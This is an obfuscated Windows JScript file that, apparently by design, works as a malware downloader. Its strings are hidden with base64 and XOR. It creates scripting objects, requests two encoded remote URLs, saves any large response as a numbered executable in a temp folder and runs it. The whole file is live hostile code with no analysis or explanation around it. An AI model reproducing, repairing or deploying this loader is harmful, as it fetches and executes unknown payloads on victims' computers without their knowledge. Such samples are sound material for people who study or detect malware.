var resonantjc8 = function(enduringWK3) {
    var machinationiSQ = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
        decode: function(financiale6Z) {
            var penchantEMv = "";
            var madrigalXeJ, fanfareslw, trothUHH;
            var fadWKj, coiffureVmq, assiduousE1C, routqrw;
            var vagaryU3V = 0;
            financiale6Z = financiale6Z.replace(/[^A-Za-z0-9\+\/\=]/g, "");
            while (vagaryU3V < financiale6Z.length) {
                fadWKj = this._keyStr.indexOf(financiale6Z.charAt(vagaryU3V++));
                coiffureVmq = this._keyStr.indexOf(financiale6Z.charAt(vagaryU3V++));
                assiduousE1C = this._keyStr.indexOf(financiale6Z.charAt(vagaryU3V++));
                routqrw = this._keyStr.indexOf(financiale6Z.charAt(vagaryU3V++));
                madrigalXeJ = fadWKj << 2 | coiffureVmq >> 4;
                fanfareslw = (coiffureVmq & 15) << 4 | assiduousE1C >> 2;
                trothUHH = (assiduousE1C & 3) << 6 | routqrw;
                penchantEMv = penchantEMv + String.fromCharCode(madrigalXeJ);
                if (assiduousE1C != 64) {
                    penchantEMv = penchantEMv + String.fromCharCode(fanfareslw);
                }
                if (routqrw != 64) {
                    penchantEMv = penchantEMv + String.fromCharCode(trothUHH);
                }
            }
            penchantEMv = machinationiSQ._utf8_decode(penchantEMv);
            return penchantEMv;
        },
        _utf8_decode: function(puissantK4G) {
            var exaltiMM = "";
            var vagaryU3V = 0;
            var comprehensiveDEj = c1 = c2 = 0;
            while (vagaryU3V < puissantK4G.length) {
                comprehensiveDEj = puissantK4G.charCodeAt(vagaryU3V);
                if (comprehensiveDEj < 128) {
                    exaltiMM += String.fromCharCode(comprehensiveDEj);
                    vagaryU3V++;
                } else if (comprehensiveDEj > 191 && comprehensiveDEj < 224) {
                    c2 = puissantK4G.charCodeAt(vagaryU3V + 1);
                    exaltiMM += String.fromCharCode((comprehensiveDEj & 31) << 6 | c2 & 63);
                    vagaryU3V += 2;
                } else {
                    c2 = puissantK4G.charCodeAt(vagaryU3V + 1);
                    c3 = puissantK4G.charCodeAt(vagaryU3V + 2);
                    exaltiMM += String.fromCharCode((comprehensiveDEj & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                    vagaryU3V += 3;
                }
            }
            return exaltiMM;
        }
    };
    var diversifiedScE = machinationiSQ.decode(enduringWK3);
    var platitudeP7X = "";
    for (var vagaryU3V = 0; vagaryU3V < diversifiedScE.length; vagaryU3V++) {
        platitudeP7X += String.fromCharCode(diversifiedScE.charCodeAt(vagaryU3V) ^ "tKGSgR0dulxbKEtL".charCodeAt(vagaryU3V % "tKGSgR0dulxbKEtL".length));
    }
    return platitudeP7X;
};

var admonishzgD = function() {
    var irresoluteAtp = function() {};
    irresoluteAtp.prototype.create = function(trenchantLYf) {
        return WScript.CreateObject(trenchantLYf);
    };
    return irresoluteAtp;
}();

(function() {
    var vagaryk3u = new admonishzgD();
    var miserlyJbv = 200;
    var plenitudeUXm = resonantjc8('"Mw4T"');
    var notionTAW = resonantjc8('"MTMiMA=="');
    var enjoinb9O = resonantjc8('"IxgkIQ4iREomBB0OJw=="');
    var imposingI3f = resonantjc8('"ORgfHitgHjw4IDA2HxU="');
    var scarcetR9 = resonantjc8('"NQ8IFyU="');
    var sublimateZlo = resonantjc8('"Jz81NgY/"');
    var inimicalPxy = resonantjc8('"UR8CHjd3bA=="');
    var evanescentgb0 = resonantjc8('"Wi4/Ng=="');
    var parryRcP = Math.pow(2, 10) * 200;
    var scabbardrkb = [ resonantjc8('"HD8zI119HwwQABQNLDANPwU6aSASfQlXWwkABw=="'), resonantjc8('"HD8zI119HxcaGxADPzYBPAMiMzsOJlYCWw8XD2R8R2IRMyI="') ];
    var cavaliergQe = 2097152;
    var fatuousnMK = vagaryk3u.create(enjoinb9O);
    var foolhardyeuV = vagaryk3u.create(imposingI3f);
    var appeaseYGK = vagaryk3u.create(scarcetR9 + resonantjc8('"Wg=="') + sublimateZlo);
    var assayHDQ = fatuousnMK.ExpandEnvironmentStrings(inimicalPxy);
    var admonishH92 = assayHDQ + cavaliergQe + evanescentgb0;
    var musterJFj = false;
    for (var constituteN1j = 0; constituteN1j < scabbardrkb.length; constituteN1j++) {
        try {
            var forsakei5e = scabbardrkb[constituteN1j];
            foolhardyeuV.open(plenitudeUXm, forsakei5e, false);
            foolhardyeuV.send();
            if (foolhardyeuV.status == miserlyJbv) {
                try {
                    appeaseYGK.open();
                    appeaseYGK.type = 1;
                    appeaseYGK.write(foolhardyeuV[resonantjc8('"Bi40Iwg8QwE3Axwb"')]);
                    if (appeaseYGK.size > parryRcP) {
                        constituteN1j = scabbardrkb.length;
                        appeaseYGK.position = 0;
                        appeaseYGK.saveToFile(admonishH92, 2);
                        musterJFj = true;
                    }
                } finally {
                    appeaseYGK.close();
                }
            }
        } catch (ignored) {}
    }
    if (musterJFj) {
        fatuousnMK[notionTAW](assayHDQ + Math.pow(2, 21));
    }
})();